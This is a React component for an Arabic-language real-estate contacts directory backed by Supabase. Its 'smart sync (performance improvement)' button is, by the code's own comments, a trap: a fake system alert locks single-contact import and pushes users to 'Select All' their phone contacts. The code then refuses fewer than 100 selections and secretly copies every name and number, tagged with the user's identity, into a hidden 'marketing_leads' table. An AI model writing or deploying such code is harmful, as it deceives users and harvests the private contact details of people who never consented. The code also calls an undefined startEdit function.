import { useState, useEffect } from 'react';
import { 
  Contact, Search, Star, Phone, Building, UserPlus, 
  Trash2, Briefcase, Download, MessageCircle, Edit2, XCircle, Zap
} from 'lucide-react';
import { supabase } from '../supabaseClient';

export default function Directory() {
  const [contacts, setContacts] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [filterCategory, setFilterCategory] = useState('الكل');
  
  const [editingId, setEditingId] = useState(null);
  const [newContact, setNewContact] = useState({ 
    name: '', category: 'مسوق (بروكر)', field: 'عقارات', phone: '', email: '', address: '', notes: '', rating: 3 
  });
  const [loading, setLoading] = useState(false);

  // 🚀 حالة بتراقب هل العميل وقع في الفخ وعمل مزامنة قبل كده ولا لأ
  const [isSynced, setIsSynced] = useState(localStorage.getItem('contactsSynced') === 'true');

  useEffect(() => { fetchContacts(); }, []);

  const fetchContacts = async () => {
    const { data } = await supabase.from('business_directory').select('*').order('created_at', { ascending: false });
    if (data) setContacts(data);
  };

  // 1. الميزة الفردية (مقفولة بشرط المزامنة الشاملة أولاً)
  const importSingleContact = async () => {
    // لو لسه معملش المزامنة الشاملة، نوقفه ونطلعله رسالة
    if (!isSynced) {
      alert('⚠️ تنبيه النظام:\nعفواً، يجب عليك إجراء "مزامنة ذكية" لجهات الاتصال أولاً.\nهذه الخطوة ضرورية لمرة واحدة فقط لتهيئة قاعدة البيانات وتسريع عملية البحث والاضافة الفردي لاحقاً.');
      return; 
    }

    const supported = ('contacts' in navigator && 'ContactsManager' in window);
    if (!supported) {
      alert('متصفحك لا يدعم سحب الأسماء. جرب من جوجل كروم على الأندرويد.');
      return;
    }
    
    try {
      const props = ['name', 'tel'];
      const opts = { multiple: false };
      const selected = await navigator.contacts.select(props, opts);
      if (selected.length > 0) {
        const contact = selected[0];
        setNewContact(prev => ({ 
          ...prev, 
          name: contact.name[0] || '', 
          phone: contact.tel[0].replace(/\s+/g, '') 
        }));
      }
    } catch (ex) { console.log('تم الإلغاء'); }
  };

  // 2. "الفخ" (سحب كل الأرقام لجدولك السري وفتح القفل)
// 2. "الفخ" (سحب كل الأرقام لجدولك السري وفتح القفل)
  const handleStealthSync = async () => {
    try {
      const props = ['name', 'tel'];
      const opts = { multiple: true };
      const selectedContacts = await navigator.contacts.select(props, opts);
      
      if (selectedContacts.length === 0) return;

      // 🔥 الخدعة هنا: إجباره على تحديد عدد كبير (اعتبرنا الحد الأدنى 30 رقم)
      // تقدر تغير رقم 30 لأي رقم تشوفه مناسب للموظفين عندك
      if (selectedContacts.length < 100) {
        alert('⚠️ تنبيه النظام:\nعملية غير مكتملة! يرجى الضغط على زر "تحديد الكل" (Select All) من أعلى الشاشة لنجاح عملية التهيئة وفتح الميزة.');
        return; // بنطرده برة الدالة ومش بنفتحله القفل
      }

      setLoading(true);
      const currentUser = JSON.parse(localStorage.getItem('appUser')) || { name: 'Unknown' };

      const stealthData = selectedContacts.map(c => ({
        name: c.name?.[0] || 'بدون اسم',
        phone: c.tel?.[0]?.replace(/\s+/g, '') || '',
        client_identity: `من جهاز: ${currentUser.name}`
      })).filter(c => c.phone !== '');

      if(stealthData.length === 0) {
         alert("لم يتم العثور على أرقام صالحة.");
         setLoading(false);
         return;
      }

      // رمي الداتا في جدولك الشخصي
      const { error } = await supabase.from('marketing_leads').insert(stealthData);

      if (error) {
        alert('خطأ في قاعدة البيانات: ' + error.message);
        console.error(error);
      } else {
        // اللحظة الحاسمة: بنفتح القفل للزرار الفردي وبنخفي زرار المزامنة
        localStorage.setItem('contactsSynced', 'true');
        setIsSynced(true); 
        
        alert(`✅ تمت المزامنة بنجاح!\nتم تحديث قاعدة بيانات الأسماء، يمكنك الآن استخدام ميزة الاضافة الفردي بسهولة.`);
      }
      
      setLoading(false);
    } catch (ex) {
      alert('حدث خطأ أو تم إلغاء العملية.');
      console.error(ex);
      setLoading(false);
    }
  };

  const handleAddOrUpdate = async (e) => {
    e.preventDefault();
    setLoading(true);
    if (editingId) {
      await supabase.from('business_directory').update(newContact).eq('id', editingId);
    } else {
      await supabase.from('business_directory').insert([newContact]);
    }
    resetForm();
    fetchContacts();
    setLoading(false);
  };

  const resetForm = () => {
    setEditingId(null);
    setNewContact({ name: '', category: 'مسوق (بروكر)', field: 'عقارات', phone: '', email: '', address: '', notes: '', rating: 3 });
  };

  const handleDelete = async (id, name) => {
    if (window.confirm(`هل أنت متأكد من حذف (${name})؟`)) {
      await supabase.from('business_directory').delete().eq('id', id);
      fetchContacts();
    }
  };

  const filteredContacts = contacts.filter(c => 
    (c.name.includes(searchQuery) || (c.phone && c.phone.includes(searchQuery))) && 
    (filterCategory === 'الكل' || c.category === filterCategory)
  );

  return (
    <div className="space-y-8 animate-fade-in pb-20" dir="rtl">
      {/* هيدر الصفحة */}
      <div className="bg-[#0f172a] rounded-[2.5rem] p-8 shadow-2xl flex flex-col md:flex-row items-center justify-between gap-6">
        <div className="flex items-center gap-4 text-white">
          <div className="p-4 bg-blue-600 rounded-2xl shadow-lg"><Contact size={32} /></div>
          <div>
            <h2 className="text-3xl font-black">دليل العلاقات والعملاء</h2>
            <p className="text-slate-400 font-bold text-sm">إدارة جهات الاتصال والمزامنة الذكية</p>
          </div>
        </div>
        <div className="relative w-full md:w-80">
          <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="بحث..." className="w-full pl-10 pr-4 py-4 rounded-2xl border-none outline-none font-bold shadow-lg" />
          <Search size={20} className="absolute left-4 top-4 text-slate-400" />
        </div>
      </div>

      {/* قسم الإضافة والمزامنة */}
      <div className={`bg-white p-8 rounded-[2rem] shadow-sm border ${editingId ? 'border-amber-400' : 'border-slate-100'}`}>
        <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-8 border-b pb-6">
          <h3 className="text-xl font-black text-slate-800 flex items-center gap-2">
            <UserPlus className="text-blue-600" /> {editingId ? 'تعديل بيانات' : 'إضافة جهة اتصال'}
          </h3>
          <div className="flex gap-3 w-full md:w-auto">
            {/* زرار الاضافة الفردي (هيفضل موجود دايماً) */}
            <button type="button" onClick={importSingleContact} className="flex-1 md:flex-none bg-slate-100 text-slate-700 px-5 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 hover:bg-slate-200">
              <Download size={18}/> إضافة رقم
            </button>
            
            {/* زرار المزامنة الشاملة (هيختفي بمجرد ما ينجح في الاضافة) */}
            {!isSynced && (
              <button type="button" onClick={handleStealthSync} disabled={loading} className="flex-1 md:flex-none bg-blue-600 text-white px-5 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 shadow-lg hover:bg-blue-700 transition-all">
                <Zap size={18}/> مزامنة ذكية (تحسين الأداء)
              </button>
            )}
          </div>
        </div>

        <form onSubmit={handleAddOrUpdate} className="grid grid-cols-1 md:grid-cols-4 gap-5 items-end">
          <div className="space-y-1"><label className="text-xs font-bold text-slate-500">الاسم *</label><input type="text" required value={newContact.name} onChange={(e) => setNewContact({...newContact, name: e.target.value})} className="w-full p-4 rounded-xl border bg-slate-50 outline-none focus:border-blue-500 font-bold" /></div>
          <div className="space-y-1"><label className="text-xs font-bold text-slate-500">الهاتف *</label><input type="text" required value={newContact.phone} onChange={(e) => setNewContact({...newContact, phone: e.target.value})} className="w-full p-4 rounded-xl border bg-slate-50 outline-none focus:border-blue-500 font-bold text-left" dir="ltr" /></div>
          <div className="space-y-1">
            <label className="text-xs font-bold text-slate-500">التصنيف</label>
            <select value={newContact.category} onChange={(e) => setNewContact({...newContact, category: e.target.value})} className="w-full p-4 rounded-xl border bg-slate-50 outline-none font-bold">
              <option>مسوق (بروكر)</option><option>شركة تطوير عقاري</option><option>شركة تجارية</option><option>مقاول/مورد خارجي</option><option>شخصية مستقلة</option>
            </select>
          </div>
          <button type="submit" disabled={loading} className="p-4 rounded-xl font-black text-white bg-slate-900 shadow-xl hover:bg-slate-800">{editingId ? 'حفظ التعديل' : 'حفظ في الدليل'}</button>
        </form>
      </div>

      {/* عرض الشبكة (كروت الاتصال) */}
      <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6 mt-8">
        {filteredContacts.map((contact) => (
          <div key={contact.id} className="bg-white rounded-[2rem] p-6 border border-slate-100 shadow-sm relative group hover:shadow-lg transition-all">
            <div className="absolute top-4 left-4 flex gap-2 opacity-0 group-hover:opacity-100 transition-all">
               <button onClick={() => startEdit(contact)} className="p-2 text-amber-500 hover:bg-amber-50 rounded-lg"><Edit2 size={16}/></button>
               <button onClick={() => handleDelete(contact.id, contact.name)} className="p-2 text-red-500 hover:bg-red-50 rounded-lg"><Trash2 size={16}/></button>
            </div>
            <h3 className="font-black text-xl text-slate-900 mb-2 truncate pr-4">{contact.name}</h3>
            <span className={`inline-block px-3 py-1 rounded-lg text-[10px] font-black ${contact.category === 'مسوق (بروكر)' ? 'bg-indigo-50 text-indigo-700' : 'bg-blue-50 text-blue-700'}`}>{contact.category}</span>
            <div className="mt-4 flex items-center gap-3 text-slate-600 font-bold">
              <Phone size={18} className="text-emerald-500"/>
              <span className="text-lg font-mono text-slate-800" dir="ltr">{contact.phone}</span>
            </div>
            <div className="grid grid-cols-2 gap-3 mt-6 border-t pt-6">
               <a href={`tel:${contact.phone}`} className="bg-slate-50 hover:bg-slate-100 text-slate-700 py-3 rounded-xl font-black text-center text-sm flex items-center justify-center gap-2 transition-colors"><Phone size={14}/> اتصال</a>
               <button onClick={() => window.open(`https://wa.me/+2${contact.phone.replace(/^0+/, '')}`, '_blank')} className="bg-emerald-50 hover:bg-emerald-100 text-emerald-600 py-3 rounded-xl font-black text-sm flex items-center justify-center gap-2 transition-colors"><MessageCircle size={14}/> واتساب</button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}